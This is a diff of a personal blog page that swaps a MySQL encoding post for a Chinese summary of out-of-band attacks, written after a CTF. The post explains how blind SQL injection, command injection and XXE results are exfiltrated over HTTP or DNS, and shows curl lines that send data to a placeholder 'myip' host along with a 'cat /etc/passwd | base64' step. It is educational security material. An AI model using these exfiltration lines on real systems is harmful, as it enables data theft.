@@ -92,21 +92,17 @@
 
 
 
-<meta name="description" content="好像这里必须要写点什么才不会显示整篇文章">
+<meta name="description" content="在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mysql数据库编码问题的原因与解决方法">
-<meta property="og:url" content="https://someonesometimes.github.io/2017/05/31/mysql数据库编码问题的原因与解决方法/index.html">
+<meta property="og:title" content="Out Of Band 带外攻击的一点总结">
+<meta property="og:url" content="https://someonesometimes.github.io/2017/11/14/Out-Of-Band-带外攻击的一点总结/index.html">
 <meta property="og:site_name" content="Yiruma">
-<meta property="og:description" content="好像这里必须要写点什么才不会显示整篇文章">
-<meta property="og:image" content="http://i.imgur.com/UthX236.png">
-<meta property="og:image" content="http://i.imgur.com/i6JDGa7.png">
-<meta property="og:image" content="http://i.imgur.com/XVYIRtx.png">
-<meta property="og:updated_time" content="2017-06-26T04:25:16.747Z">
+<meta property="og:description" content="在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用">
+<meta property="og:updated_time" content="2017-11-14T15:58:23.665Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="mysql数据库编码问题的原因与解决方法">
-<meta name="twitter:description" content="好像这里必须要写点什么才不会显示整篇文章">
-<meta name="twitter:image" content="http://i.imgur.com/UthX236.png">
+<meta name="twitter:title" content="Out Of Band 带外攻击的一点总结">
+<meta name="twitter:description" content="在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用">
 
 
 
@@ -134,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="https://someonesometimes.github.io/2017/05/31/mysql数据库编码问题的原因与解决方法/"/>
+  <link rel="canonical" href="https://someonesometimes.github.io/2017/11/14/Out-Of-Band-带外攻击的一点总结/"/>
 
 
 
 
 
-  <title>mysql数据库编码问题的原因与解决方法 | Yiruma</title>
+  <title>Out Of Band 带外攻击的一点总结 | Yiruma</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -298,7 +294,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="https://someonesometimes.github.io/2017/05/31/mysql数据库编码问题的原因与解决方法/">
+    <link itemprop="mainEntityOfPage" href="https://someonesometimes.github.io/2017/11/14/Out-Of-Band-带外攻击的一点总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yiruma">
@@ -315,7 +311,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">mysql数据库编码问题的原因与解决方法</h1>
+          <h1 class="post-title" itemprop="name headline">Out Of Band 带外攻击的一点总结</h1>
         
 
         <div class="post-meta">
@@ -327,8 +323,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-31T19:35:32+08:00">
-                2017-05-31
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-14T22:51:05+08:00">
+                2017-11-14
               </time>
             
 
@@ -367,22 +363,34 @@
       
 
       
-        <p>好像这里必须要写点什么才不会显示整篇文章<br><a id="more"></a><br>mysql为不同场景下配置了不同的编码方案，像数据的存储，数据库连接的当前编码，我们通过sql语句<code>show variables like &#39;%character%&#39;;</code>就可以看到如下显示：<img src="http://i.imgur.com/UthX236.png" alt="">详细解释了各种场景下编码的意义：</p>
-<blockquote>
-<p>a、其中client是客户端使用的字符集，相当于网页中的字符集设置如下 </p>
-<p><metahttp-equiv="content-type"content="text html;="" charset="utf-8"">。<br>b、其中的connection是连接数据库的字符集设置类型，如果php没有指明连接数据库使用的字符集类型<br>就按照服务器端默认的字符集设置。<br>c、其中database是数据库服务器中某个库使用的字符集设定，如果建库时没有指明，将使用服务器安装<br>时指定的字符集设置。<br>d、results是数据库给客户端返回时使用的字符集设定，如果没有指明，使用服务器默认的字符集。<br>e、server是服务器安装时指定的默认字符集设定。<br>f、system是数据库系统使用的字符集设定。 </metahttp-equiv="content-type"content="text></p>
-</blockquote>
-<p>我们从PHP对数据库进行操作的一次过程中，涉及到多个场景，先是PHP自身编码方案决定了它构建并发出的那条sql语句是什么编码的，之后语句执行后拿到的数据又会是一种编码，就是数据库中存储数据的编码方案，之后再以发送给php，这些场景中数据的编码方案是不同的，而mysql会在不同场景切换中对数据进行编码转换话，如果执行过程中数据的编码转化与mysql上表的配置不同，就会出现编码的问题，而出现问题的原因一般有两条：</p>
-<h3 id="数据库对数据存储的编码方案"><a href="#数据库对数据存储的编码方案" class="headerlink" title="数据库对数据存储的编码方案"></a>数据库对数据存储的编码方案</h3><p>这个问题的产生比较奇怪，从上面表的character_set_database 我们可以看到，默认的数据库对数据存储的编码方案采用的是<strong>latin1</strong>，这种编码方案收录的字符除ASCII收录的字符外，还包括西欧语言、希腊语、泰语、阿拉伯语、希伯来语对应的文字符号，<strong>但是没有中文！！！！</strong>所以遇到中文的编码方案会出现报错或是乱码。。。<br>解决的方式也很简单，我们在新建数据库时为其指定默认的编码方案，使用支持中文的gbk,utf8编码就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">create database test default character set gbk;</div><div class="line">create database test default character set utf8;</div></pre></td></tr></table></figure></p>
-<p>之后进入到这个数据库再看编码方案，在character_set_database那一栏就会有对应的修改了</p>
-<h3 id="sql语句的编码方案"><a href="#sql语句的编码方案" class="headerlink" title="sql语句的编码方案"></a>sql语句的编码方案</h3><p>也就所输入sql语句是怎样编码的，如果sql语句的编码与mysql中记录的理解方式也就是编码方案不同，那自然也会出现问题。<br>给出几个场景的例子，比如我在cmd中对mysql进行操作，cmd的默认编码是GBK<img src="http://i.imgur.com/i6JDGa7.png" alt=""><br>而mysql中会按照记录中的utf8进行操作，这时就是出现问题<br>再比如PHP所发出的sql语句具体采用什么编码方案，取决于PHP运行环境中的编码（如果你不进行手动的解码再编码到指定码的话），这时也有可能出现于mysql中默认编码方案不同的问题</p>
-<p>解决方式同样很简单，我们进行数据库操作时候，无论是使用命令行，还是调用高级语言的接口，都先指定自己的sql语句是以什么形式编码的，即语句<code>set names 编码方案</code>。这样之后就会修改当前操作下mysql的编码方案，像这张图就是我执行<code>set names gbk</code>后的改变结果：<img src="http://i.imgur.com/XVYIRtx.png" alt=""></p>
-<h3 id="正好今天在用python3链接数据库，把我的编码配置扔出来"><a href="#正好今天在用python3链接数据库，把我的编码配置扔出来" class="headerlink" title="正好今天在用python3链接数据库，把我的编码配置扔出来"></a>正好今天在用python3链接数据库，把我的编码配置扔出来</h3><ul>
-<li>数据库编码还是在创建时改为utf8</li>
-<li>链接时指定客户端编码<br><code>pymysql.connect(host=&#39;localhost&#39;, port=3306, user=&#39;root&#39;, passwd=&#39;root&#39;, db=&#39;blog&#39;, charset=&#39;utf8&#39;)</code></li>
-<li>指定编码格式<br><code>cur.execute(&quot;set names utf8&quot;)</code></li>
+        <p>在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用</p>
+<a id="more"></a>
+<h2 id="什么是带外攻击，应用场景有哪些？"><a href="#什么是带外攻击，应用场景有哪些？" class="headerlink" title="什么是带外攻击，应用场景有哪些？"></a>什么是带外攻击，应用场景有哪些？</h2><p>在很多攻击中，可能我们无法直接看到攻击的回显，也许攻击行为的确产生了，但数据并不一定能够回显到攻击者的眼中，这时候我们可以借助网络请求，将回显结果发送到我们的服务器上，就可以看到回显了，这种方式就叫做带外攻击</p>
+<p>比较常见的使用场景有这些，如果我们无法直接看到攻击的回显，就可以考虑使用带外攻击来通过网络请求拿到回显数据</p>
+<ul>
+<li>命令执行</li>
+<li>sql注入</li>
+<li>XXE</li>
 </ul>
-<p>然后就OK了</p>
+<h2 id="介绍几个常用的接收回显的网站"><a href="#介绍几个常用的接收回显的网站" class="headerlink" title="介绍几个常用的接收回显的网站"></a>介绍几个常用的接收回显的网站</h2><ul>
+<li><p>火日师傅在github上开源的<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="external">xss平台</a></p>
+<p>好处是搭在自己的vps上面，修改使用起来都十分方便，而且记录的参数十分详细，cookie，post，get的数据都能拿到，问题是没法获得基于dns方式的数据，而且链接限制在了<a href="http://ip/xss/这样，url形式不能修改，只能改变传输的参数" target="_blank" rel="external">http://ip/xss/这样，url形式不能修改，只能改变传输的参数</a></p>
+</li>
+<li><p><a href="http://ceye.io" target="_blank" rel="external">ceye平台</a></p>
+<p>应该是知道创宇的平台，为每个用户分配一个识别url，方便的地方是除了支持http链接接收，还可以通过dns方式接收回显，并且链接的形式比较随意，域名啊，后面的路径啊都随意，只要域名是基于为自己分配的指定url就可以。不太方便的地方就是貌似对http方式发送回显的接收结果中是看不到太详细的数据的。</p>
+</li>
+</ul>
+<h2 id="带外攻击中两种回显信息发送方式"><a href="#带外攻击中两种回显信息发送方式" class="headerlink" title="带外攻击中两种回显信息发送方式"></a>带外攻击中两种回显信息发送方式</h2><h3 id="很常见的通过http方式发送，回显信息可以放在以下几个位置："><a href="#很常见的通过http方式发送，回显信息可以放在以下几个位置：" class="headerlink" title="很常见的通过http方式发送，回显信息可以放在以下几个位置："></a>很常见的通过http方式发送，回显信息可以放在以下几个位置：</h3><ul>
+<li><a href="http://myip/id=xxxxx" target="_blank" rel="external">http://myip/id=xxxxx</a> get参数部分</li>
+<li>curl –cookie id=xxxx <a href="http://myip" target="_blank" rel="external">http://myip</a>   放在cookie里</li>
+<li>curl –data id=xxxx <a href="http://myip" target="_blank" rel="external">http://myip</a>    放在post参数</li>
+<li><a href="http://myip/xxxx" target="_blank" rel="external">http://myip/xxxx</a> 放在路径里</li>
+</ul>
+<p>有一点要提醒的是，测试中看到，发送数据有换行的话，或多或少的都会有问题，因为建议将数据进行编码后再传输，比如在命令注入中可以使用<code>cat /etc/passwd | base64</code>来将回显结果进行编码</p>
+<h3 id="通过DNS解析方式来获得回显"><a href="#通过DNS解析方式来获得回显" class="headerlink" title="通过DNS解析方式来获得回显"></a>通过DNS解析方式来获得回显</h3><p>这也是在HCTF中才知道的姿势（哎，感觉自己孤陋寡闻，真的好菜。。。）。大致原理是这样的，还是发送一个链接，我们将回显信息放到域名里去，大致就是<a href="http://xxxx.myip/这种形式，服务器对于这种链接会首先进行DNS解析来拿到对应域名的IP才能发送IP报文，而这种DNS报我们是可以拿到的，就是通过上面介绍到的ceye平台，可以查询DNS报，也就是某个域名的解析记录，这样我们就可以拿到了回显的数据" target="_blank" rel="external">http://xxxx.myip/这种形式，服务器对于这种链接会首先进行DNS解析来拿到对应域名的IP才能发送IP报文，而这种DNS报我们是可以拿到的，就是通过上面介绍到的ceye平台，可以查询DNS报，也就是某个域名的解析记录，这样我们就可以拿到了回显的数据</a></p>
+<p>讲道理这种方式很明显没有直接通过http发送数据来的方便，但的确在某些时候只能用这种方式来对外发送请求将数据传输出来，通过对HCTF中那道sql题目的测试，可以发现loadfile(‘\\\\vips\x\‘?id=123)在平台上是接收不到请求的，从sql执行结果上看执行时间是0s，看来没有发送网络请求，只有我们换一个域名，在不同域名的时候，sql执行结果才会显示花费了一定的时间，看来是用来进行DNS查询了，在这种sql的带外攻击中，loadfile函数只能配合DNS方式的回显才能做到</p>
+<h2 id="一些payload"><a href="#一些payload" class="headerlink" title="一些payload"></a>一些payload</h2><p>可以直接参见ceye的网站，里面有各种攻击场景下的payload，还是很全的</p>
+<p><a href="http://ceye.io/payloads" target="_blank" rel="external">http://ceye.io/payloads</a></p>
 
       
     </div>
@@ -419,18 +427,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/06/15/python模块使用记录/" rel="next" title="python模块使用记录">
-                <i class="fa fa-chevron-left"></i> python模块使用记录
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/05/28/优化-pythonic/" rel="prev" title="优化 pythonic">
-                优化 pythonic <i class="fa fa-chevron-right"></i>
+              <a href="/2017/10/23/Java阻塞队列学习及LinkedBlockingQueue源码分析/" rel="prev" title="Java阻塞队列学习及LinkedBlockingQueue源码分析">
+                Java阻塞队列学习及LinkedBlockingQueue源码分析 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -551,7 +555,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#数据库对数据存储的编码方案"><span class="nav-number">1.</span> <span class="nav-text">数据库对数据存储的编码方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql语句的编码方案"><span class="nav-number">2.</span> <span class="nav-text">sql语句的编码方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#正好今天在用python3链接数据库，把我的编码配置扔出来"><span class="nav-number">3.</span> <span class="nav-text">正好今天在用python3链接数据库，把我的编码配置扔出来</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是带外攻击，应用场景有哪些？"><span class="nav-number">1.</span> <span class="nav-text">什么是带外攻击，应用场景有哪些？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#介绍几个常用的接收回显的网站"><span class="nav-number">2.</span> <span class="nav-text">介绍几个常用的接收回显的网站</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#带外攻击中两种回显信息发送方式"><span class="nav-number">3.</span> <span class="nav-text">带外攻击中两种回显信息发送方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#很常见的通过http方式发送，回显信息可以放在以下几个位置："><span class="nav-number">3.1.</span> <span class="nav-text">很常见的通过http方式发送，回显信息可以放在以下几个位置：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过DNS解析方式来获得回显"><span class="nav-number">3.2.</span> <span class="nav-text">通过DNS解析方式来获得回显</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些payload"><span class="nav-number">4.</span> <span class="nav-text">一些payload</span></a></li></ol></div>
             
 
           </div>
